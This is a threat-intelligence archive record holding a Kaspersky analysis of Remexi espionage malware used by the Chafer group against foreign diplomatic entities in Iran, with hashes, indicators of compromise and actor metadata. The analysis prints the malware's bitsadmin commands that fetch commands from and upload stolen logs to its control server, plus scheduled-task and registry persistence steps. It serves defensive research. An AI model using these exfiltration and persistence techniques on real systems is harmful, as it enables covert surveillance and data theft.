{
    "id": "4b7e0cfb-7f34-4d26-8e48-571ce623087e",
    "created_at": "2022-10-25T16:48:23.913568Z",
    "updated_at": "2025-03-27T02:14:30.712382Z",
    "deleted_at": null,
    "sha1_hash": "b4972c4bc6cc763054e9cfd16970303c7a0f6c35",
    "title": "Chafer used Remexi malware to spy on Iran-based foreign diplomatic entities",
    "authors": "Kaspersky",
    "file_creation_date": "2019-09-16T19:19:58Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 96751,
    "plain_text": "# Chafer used Remexi malware to spy on Iran-based foreign diplomatic entities\n\n**securelist.com/chafer-used-remexi-malware/89538**\n\nBy Denis Legezo\n\n## Executive Summary\n\nThroughout the autumn of 2018 we analyzed a long-standing (and still active at that time)\ncyber-espionage campaign that was primarily targeting foreign diplomatic entities based in\nIran. The attackers were using an improved version of Remexi in what the victimology\nsuggests might be a domestic cyber-espionage operation. This malware has previously been\nassociated with an APT actor that Symantec calls Chafer.\n\nThe malware can exfiltrate keystrokes, screenshots, browser-related data like cookies and\nhistory, decrypted when possible. The attackers rely heavily on Microsoft technologies on\nboth the client and server sides: the Trojan uses standard Windows utilities like Microsoft\nBackground Intelligent Transfer Service (BITS) bitsadmin.exe to receive commands and\nexfiltrate data. Its C2 is based on IIS using .asp technology to handle the victims’ HTTP\nrequests.\n\nRemexi developers use the C programming language and GCC compiler on Windows in the\nMinGW environment. They most likely used the Qt Creator IDE in a Windows environment.\nThe malware utilizes several persistence mechanisms including scheduled tasks, Userinit\nand Run registry keys in the HKLM hive.\n\nXOR and RC4 encryption is used with quite long unique keys for different samples. Among\nall these random keys once the word “salamati” was also used, which means “health” in\nFarsi.\n\nKaspersky Lab products detect the malware described in this report as Trojan.Win32.Remexi\nand Trojan.Win32.Agent. This blogpost is based in our original report shared with our APT\nIntelligence Reporting customers last November 2018. For more information please contact:\n[intelreports@kaspersky.com](mailto:intelreports@kaspersky.com)\n\n## Technical analysis\n\nThe main tool used in this campaign is an updated version of the Remexi malware, publicly\nreported by Symantec back in 2015. The newest module’s compilation timestamp is March\n2018. The developers used GCC compiler on Windows in the MinGW environment.\n\n\n-----\n\nInside the binaries the compiler left references to the names of the C source file modules\nused: “operation_reg.c”, “thread_command.c” and “thread_upload.c”. Like mentioned in\nmodules file names the malware consists of several working threads dedicated to different\ntasks, including C2 command parsing and data exfiltration. For both the receiving of C2\ncommands and exfiltration, Remexi uses the Microsoft Background Intelligent Transfer\nService (BITS) mechanism to communicate with the C2 over HTTP.\n\n### Proliferation\n\nSo far, our telemetry hasn’t provided any concrete evidence that shows us how the Remexi\nmalware spread. However, we think it’s worth mentioning that for one victim we found a\ncorrelation between the execution of Remexi´s main module and the execution of an AutoIt\nscript compiled as PE, which we believe may have dropped the malware. This dropper used\nan FTP with hardcoded credentials to receive its payload. FTP server was not accessible any\nmore at the time of our analysis.\n\n### Malware features\n\nRemexi boasts features that allow it to gather keystrokes, take screenshots of windows of\ninterest (as defined in its configuration), steal credentials, logons and the browser history,\nand execute remote commands. Encryption consists of XOR with a hardcoded key for its\nconfiguration and RC4 with a predefined password for encrypting the victim’s data.\n\nRemexi includes different modules that it deploys in its working directory, including\nconfiguration decryption and parsing, launching victim activity logging in a separate module,\nand seven threads for various espionage and auxiliary functions. The Remexi developers\nseem to rely on legitimate Microsoft utilities, which we enumerate in the table below.\n\n**Utility** **Usage**\n\nextract.exe Deploys modules from the .cab file into the working Event Cache directory\n\nbitsadmin.exe Fetches files from the C2 server to parse and execute commands. Send\nexfiltrated data\n\ntaskkill.exe Ends working cycle of modules\n\n### Persistence\n\nPersistence modules are based on scheduled tasks and system registry. Mechanisms vary\nfor different OS versions. In the case of old Windows versions like XP, main module\nevents.exe runs an edited XPTask.vbs Microsoft sample script to create a weekly scheduled\ntask for itself. For newer operating systems, events.exe creates task.xml as follows:\n\n\n-----\n\nThen it creates a Windows scheduled task using the following command:\n\n1 schtasks.exe /create /TN \\\"Events\\\\CacheTask_<user_name_here>\" /XML \\\"\n<event_cache_dir_path>t /F\"\n\nAt the system registry level, modules achieve persistence by adding themselves into the key:\n\nHKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\n\nwhen it finds possible add values to the Winlogon subkey, and in\n\nHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Microsoft Activity Manager. All\nsuch indicators of comprometation are mentioned in correspondent appendix below.\n\n### Commands\n\nAll the commands received from the C2 are first saved to an auxiliary file and then stored\nencrypted in the system registry. The standalone thread will decrypt and execute them.\n\n**Command** **Description**\n\nsearch Searches for corresponding files\n\nsearch&upload Encrypts and adds the corresponding files to the upload directory with the\nprovided name\n\nuploadfile Encrypts and adds the specified file to the upload directory with the provided\nname\n\nuploadfolder Encrypts and adds the mentioned directory to the upload directory with the\nprovided name\n\nshellexecute Silently executes received command with cmd.exe\n\nwmic Silently executes received command with wmic.exe (for WMI commands)\n\nsendIEPass Encrypts and adds all gathered browser data into files for upload to C2\n\nuninstall Removes files, directory and BITS tasks\n\n### Cryptography\n\n\n-----\n\nTo decrypt the configuration data, the malware uses XOR with 25-character keys such as\n“waEHleblxiQjoxFJQaIMLdHKz” that are different for every sample. RC4 file encryption relies\non the Windows 32 CryptoAPI, using the provided value’s MD5 hash as an initial vector.\nAmong all these random keys once the word “salamati” was also used, which means\n“health” in Farsi.\n\n### Configuration\n\nConfig.ini is the file where the malware stores its encrypted configuration data. It contains\nthe following fields:\n\n**Field** **Sample value** **Description**\n\ndiskFullityCheckRatio 1.4 Malware working directory size\nthreshold. It will be deleted if it\nbecomes as large as the free\navailable space multiplied by this\nratio\n\ncaptureScreenTimeOut 72 Probability of full and active window\nscreenshots being taken after mouse\ncaptureActiveWindowTimeOut 313 click\n\ncaptureScreenQC 40 Not really used. Probably full and\nactive window screenshot quality\ncaptureActiveQC 40\n\n\nCaptureSites VPN*0,0\nLogin*0,0\nmail*0,0\nSecurity*0,0\n\nimportant upLog.txt\nupSCRLog.txt\nupSpecial.txt\nupFile.txt\nupMSLog.txt\n\n\nWindow titles of interest for\nscreenshots, using left mouse button\nand Enter keypress hook\n\nList of files to send to C2 using\nbitsadmin.exe from the dedicated\nthread\n\n\nmaxUpFileSizeKByte 1000000 Maximum size of file uploaded to C2\n\nServers http://108.61.189.174 Control server HTTP URL\n\nZipPass KtJvOXulgibfiHk Password for uploaded zip archives\n\n\n-----\n\nbrowserPasswordCheckTimeout 300000 Milliseconds to wait between\ngathering key3.db, cookies.sqlite and\nother browser files in dedicated\nthread\n\nMost of the parameters are self-explanatory. However, captureScreenTimeOut and\ncaptureActiveWindowTimeOut are worth describing in more detail as their programming\nlogic is not so intuitive.\n\nOne of the malware threads checks in an infinite loop if the mouse button was pressed and\nthen also increments the integer iterator infinitely. If the mouse hooking function registers a\nbutton hit, it lets the screenshotting thread know about it through a global variable. After\nthat, it checks if the iterator divided by\n(captureScreenTimeOut/captureActiveWindowTimeOut) has a remainder of 0. In that case, it\ntakes a screenshot.\n\n### Main module (events.exe)\n\n**SHA256** b1fa803c19aa9f193b67232c9893ea57574a2055791b3de9f836411ce000ce31\n\n**MD5** c981273c32b581de824e1fd66a19a281\n\n**Compiled** GCC compiler in MinGW environment version 2.24, timestamp set to 1970 by\ncompiler\n\n**Type** I386 Windows GUI EXE\n\n**Size** 68 608\n\nAfter checking that the malware is not already installed, it unpacks HCK.cab using the\nMicrosoft standard utility expand.exe with the following arguments:\n\n1 expand.exe -r \\\"<full path to HCK.cab>\\\" -f:* \\\"<event_cache_dir_path>\\\\\\\"\n\nThen it decrypts config.ini file with a hardcoded 25-byte XOR key that differs for every\nsample. It sets keyboard and mouse hooks to its handlekeys() and MouseHookProc()\nfunctions respectively and starts several working threads:\n\n**ID** **Thread description**\n\n1 Gets commands from C2 and saves them to a file and system registry using the\nbitsadmin.exe utility\n\n2 Decrypts command from registry using RC4 with a hardcoded key, and executes it\n\n\n-----\n\n3 Transfers screenshots from the clipboard to \\Cache005 subdirectory and Unicode text from\nclipboard to log.txt, XOR-ed with the “salamati” key (“health” in Farsi)\n\n4 Transfers screenshots to \\Cache005 subdirectory with captureScreenTimeOut and\ncaptureScreenTimeOut frequencies\n\n5 Checks network connection, encrypts and sends gathered logs\n\n6 Unhooks mouse and keyboard, removes bitsadmin task\n\n7 Checks if malware’s working directory size already exceeds its threshold\n\n8 Gathers victim´s credentials, visited website cache, decrypted Chrome login data, as well as\nFirefox databases with cookies, keys, signons and downloads\n\nThe malware uses the following command to receive data from its C2:\n\n\n1\n2\n\n\nbitsadmin.exe /TRANSFER HelpCenterDownload /DOWNLOAD /PRIORITY normal <server>\n<file>\nhttp://<server_config>/asp.asp?ui=<host_name>nrg-<adapter_info>-<user_name>\n\n\n### Activity logging module (Splitter.exe)\n\nThis module is called from the main thread to obtain screenshots of windows whose titles\nare specified in the configuration CaptureSites field, bitmaps and text from clipboard, etc.\n\n**SHA256** a77f9e441415dbc8a20ad66d4d00ae606faab370ffaee5604e93ed484983d3ff\n\n**MD5** 1ff40e79d673461cd33bd8b68f8bb5b8\n\n**Compiled** 2017.08.06 11:32:36 (GMT), 2.22\n\n**Type** I386 Windows Console EXE\n\n**Size** 101 888\n\nInstead of implementing this auxiliary module in the form of a dynamic linked library with\nits corresponding exported functions, the developers decided to use a standalone\nexecutable started by events.exe with the following parameters:\n\n**Parameter** **Description**\n\n-scr Screenshot file name to save in Cache006 subdirectory, zipped with password\nfrom configuration. Can capture all screen (“AllScreen”) or the active window\n(“ActiveWindow”)\n\n\n-----\n\n-ms Screenshot file name to save in Cache006 subdirectory, zipped with password\nfrom configuration. Specifies the screen coordinates to take\n\n-zip Name of password (from configuration data) protected zip archive\n\n-clipboard Screenshot file name where a bitmap from the clipboard is saved in Cache005\nsubdirectory, zipped with password from configuration\n\n### Data exfiltration\n\n[Exfiltration is done through the bitsadmin.exe utility. The BITS mechanism has existed since](https://docs.microsoft.com/en-us/windows/desktop/Bits/bitsadmin-tool)\nWindows XP up to the current Windows 10 versions and was developed to create\ndownload/upload jobs, mostly to update the OS itself. The following is the command used\nto exfiltrate data from the victim to the C2:\n\n1 bitsadmin.exe /TRANSFER HelpCenterUpload /UPLOAD /PRIORITY normal \"\n<control_server>/YP01_<victim_fingerprint>_<log_file_name>\" \"<log_file_name>\"\n\n## Victims\n\nThe vast majority of the users targeted by this new variant of Remexi appear to have Iranian\nIP addresses. Some of these appear to be foreign diplomatic entities based in the country.\n\n## Attribution\n\nThe Remexi malware has been associated with an APT actor called [Chafer by Symantec.](https://www.securityweek.com/iran-linked-chafer-group-expands-toolset-targets-list)\n\nOne of the human-readable encryption keys used is “salamati”. This is probably the Latin\nspelling for the word “health” in Farsi. Among the artifacts related to malware authors, we\nfound in the binaries a .pdb path containing the Windows user name “Mohamadreza New”.\nInterestingly, the FBI website for wanted cybercriminals includes two Iranians called\n[Mohammad](https://www.fbi.gov/wanted/cyber/mohammed-reza-sabahi) [Reza, although this could be a common name or even a false flag.](https://www.fbi.gov/wanted/cyber/mohammad-reza-rezakhah)\n\n## Conclusions\n\nActivity of the Chafer APT group has been observed since at least 2015, but based on things\nlike compilation timestamps and C&C registration, it’s possible they have been active for\neven longer. Traditionally, Chafer has been focusing on targets inside Iran, although their\ninterests clearly include other countries in the Middle East.\n\nWe will continue to monitor how this set of activity develops in the future.\n\n\n-----\n\n## Indicators of compromise\n\n### File hashes\n\n**events.exe**\n028515d12e9d59d272a2538045d1f636\n03055149340b7a1fd218006c98b30482\n25469ddaeff0dd3edb0f39bbe1dcdc46\n41b2339950d50cf678c0e5b34e68f537\n4bf178f778255b6e72a317c2eb8f4103\n7d1efce9c06a310627f47e7d70543aaf\n9f313e8ef91ac899a27575bc5af64051\naa6246dc04e9089e366cc57a447fc3a4\nc981273c32b581de824e1fd66a19a281\ndcb0ea3a540205ad11f32b67030c1e5a\n\n**splitter.exe**\nc6721344af76403e9a7d816502dca1c8\nd3a2b41b1cd953d254c0fc88071e5027\n1FF40E79D673461CD33BD8B68F8BB5B8\necae141bb068131108c1cd826c82d88b\n12477223678e4a41020e66faebd3dd95\n460211f1c19f8b213ffaafcdda2a7295\n53e035273164f24c200262d61fa374ca\n\n### Domains and IPs\n\n108.61.189.174\n\n### Hardcoded mutexes\n\nLocal\\TEMPDAHCE01\nLocal\\zaapr\nLocal\\reezaaprLog\nLocal\\{Temp-00-aa-123-mr-bbb}\n\n### Scheduled task\n\nCacheTask_<user_name_here>\n\n### Directory with malicious modules\n\nMain malware directory: %APPDATA%\\Microsoft\\Event Cache\nCommands from C2 in subdirectory: Cache001\\cde00 acf\n\n\n-----\n\n### Events.exe persistence records in Windows system registry keys\n\nHKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\nHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Microsoft Activity Manager\n\n### Victims’ fingerprints stored in\n\nHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\PidRegData or\nHKCU\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\PidRegData\n\n### RC4 encrypted C2 commands stored in\n\nHKCU\\SOFTWARE\\Microsoft\\Fax\n\n### HTTP requests template\n\nhttp://<server_ip_from_config>/asp.asp?ui=<host_name>nrg-<adapter_info>-<user_name>\nAnd bitsadmin.exe task to external network resources, addressed by IP addresses\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/s41gyec3zirgpgysovuhc2dj065ecrdy"
    ],
    "report_names": [
        "Kaspersky_Chafer-Remexi-Iran-diplomatic(01-30-2019)"
    ],
    "threat_actors": [
        {
            "id": "bee22874-f90e-410b-93f3-a2f9b1c2e695",
            "created_at": "2022-10-25T16:07:23.45097Z",
            "updated_at": "2025-03-27T02:02:09.808919Z",
            "deleted_at": null,
            "main_name": "Chafer",
            "aliases": [
                "APT 39",
                "Cobalt Hickman",
                "ITG07",
                "Radio Serpens",
                "Remix Kitten",
                "TA454"
            ],
            "source_name": "ETDA:Chafer",
            "tools": [
                "ASPXSpy",
                "ASPXTool",
                "Antak",
                "CACHEMONEY",
                "EternalBlue",
                "HTTPTunnel",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "MechaFlounder",
                "Metasploit",
                "Mimikatz",
                "NBTscan",
                "NSSM",
                "Non-sucking Service Manager",
                "POWBAT",
                "Plink",
                "PuTTY Link",
                "Rana",
                "Remcom",
                "Remexi",
                "RemoteCommandExecution",
                "SafetyKatz",
                "UltraVNC",
                "WCE",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "nbtscan",
                "pwdump"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "a761f2a6-26ba-47fd-89c3-6a74f847a3b2",
            "created_at": "2024-05-01T02:03:08.025289Z",
            "updated_at": "2025-03-27T02:05:17.312292Z",
            "deleted_at": null,
            "main_name": "COBALT HICKMAN",
            "aliases": [
                "Chafer ",
                "ITG07 ",
                "APT39 "
            ],
            "source_name": "Secureworks:COBALT HICKMAN",
            "tools": [
                " Mimikatz",
                " Remexi",
                " TREKX",
                "MechaFlounder"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "6b6155e4-94ec-4909-b908-550afe758ad6",
            "created_at": "2022-10-25T15:50:23.365074Z",
            "updated_at": "2025-03-27T02:00:55.455014Z",
            "deleted_at": null,
            "main_name": "APT39",
            "aliases": [
                "APT39",
                "ITG07",
                "Remix Kitten"
            ],
            "source_name": "MITRE:APT39",
            "tools": [
                "NBTscan",
                "MechaFlounder",
                "Remexi",
                "CrackMapExec",
                "pwdump",
                "Mimikatz",
                "Windows Credential Editor",
                "Cadelspy",
                "PsExec",
                "ASPXSpy",
                "ftp"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1666716503,
    "ts_updated_at": 1743041670,
    "ts_creation_date": 1568661598,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/b4972c4bc6cc763054e9cfd16970303c7a0f6c35.pdf",
        "text": "https://archive.orkl.eu/b4972c4bc6cc763054e9cfd16970303c7a0f6c35.txt",
        "img": "https://archive.orkl.eu/b4972c4bc6cc763054e9cfd16970303c7a0f6c35.jpg"
    }
}